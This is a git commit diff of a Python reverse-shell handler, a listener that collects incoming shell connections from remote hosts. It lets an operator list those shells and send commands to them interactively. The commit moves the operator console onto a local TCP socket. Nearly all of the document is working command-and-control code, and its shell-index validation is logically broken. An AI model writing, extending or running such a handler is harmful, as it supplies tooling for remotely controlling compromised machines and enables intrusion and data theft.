d38ee59b8b29946253eeca669561b9683a3f8cf7
hollohan <hollohan@hotmail.com>
2023-11-17 20:00:56 -0500

    update

--- shell_handler.py
+++ shell_handler.py
@@ -26,44 +26,54 @@ def handle_connections():
         shells.append({'addr': addr[0], 'port': addr[1], 'conn': conn})
 
 # cli funcs
-def show_shells(): # print all items in the shells global var
+def show_shells(conn): # print all items in the shells global var
     for i in range(len(shells)):
-        print(f'[{i}] {shells[i]["addr"]}')
+        conn.sendall(f'[{i}] {shells[i]["addr"]}\n'.encode('utf-8'))
 
-def send_command(): # send a command to a shell
-    shell_index = int(input('shell#> '))
+def send_command(conn): # send a command to a shell
+    conn.sendall(b'shell#> ')
+    shell_index = conn.recv(1024).rstrip().decode('utf-8')
+    if not shell_index.isnumeric():
+        conn.sendall(b'input must be a shell index')
+        return 1
+    
+    shell_index = int(shell_index)
     if  0 > shell_index > len(shells)-1:
-        print('invalid shell index')
+        conn.sendall(b'invalid shell index')
         return -1
     shell = shells[shell_index]
-    cmd = input('cmd> ')
+    conn.sendall(b'cmd> ')
+    cmd = conn.recv(1024).rstrip().decode('utf-8')
     cmd = cmd+'\n'
     shell['conn'].sendall(cmd.encode('utf-8'))
-    resp = shell['conn'].recv(1024)
-    write_log(f'{shell["addr"]}.txt', cmd)
+    resp = shell['conn'].recv(2048)
+    write_log(f'{shell["addr"]}.txt', '> '+cmd)
     write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
-    print(resp.decode('utf-8'))
+    conn.sendall(resp+b'\n')
 
-def do_interactive():
-    shell_index = input('shell#> ')
+def do_interactive(conn):
+    conn.sendall(b'shell#> ')
+    shell_index = conn.recv(1024).rstrip().decode('utf-8')
     # input validation
     if not shell_index.isnumeric():
-        print(f'input must be a shell index')
+        conn.sendall(b'input must be a shell index')
         return 1
     shell_index = int(shell_index)
     if  0 > shell_index > len(shells)-1:
-        print('invalid shell index')
+        conn.sendall(b'invalid shell index')
         return -1
     shell = shells[shell_index]
     while True:
-        cmd = input(f'{shell_index}$')
+        msg = f'{shell_index}$ '.encode('utf-8')
+        conn.sendall(msg)
+        cmd = conn.recv(1024).rstrip().decode('utf-8')
         if cmd == '.exit': return 0
         cmd = cmd+'\n'
         shell['conn'].sendall(cmd.encode('utf-8'))
         resp = shell['conn'].recv(1024)
-        write_log(f'{shell["addr"]}.txt', cmd)
+        write_log(f'{shell["addr"]}.txt', '> '+cmd)
         write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
-        print(resp.decode('utf-8'))
+        conn.sendall(resp)
 
 # args
 parser = argparse.ArgumentParser()
@@ -75,8 +85,10 @@ ip = '0.0.0.0'
 # start listener
 t = threading.Thread(target=handle_connections, daemon=True).start()
 
-def show_opts():
-    for opt in opts: print(f'{opt}')
+def show_opts(conn):
+    for opt in opts:
+        cmd = opt.encode('utf-8') + b'\n'
+        conn.sendall(cmd)
 
 # cli
 opts = {
@@ -85,9 +97,25 @@ opts = {
     'interactive': do_interactive,
     'i': do_interactive,
     'help': show_opts,
-    '.exit': exit
+    'end': 0
+    #'.exit': exit
 }
 
 while True:
-    cmd = input('> ')
-    if cmd in opts: opts[cmd]()
+    print(f'opening listener on 127.0.0.1:7000... ', end='')
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('127.0.0.1', 7000))
+    print('done. :)')
+    s.listen(1)
+    conn, addr = s.accept()
+    while True:
+        conn.sendall(b'> ')
+        cmd = conn.recv(1024)
+        cmd = cmd.rstrip()
+        cmd = cmd.decode('utf-8')
+        if cmd == 'end':
+            conn.close()
+            break
+        if cmd in opts: opts[cmd](conn)
+
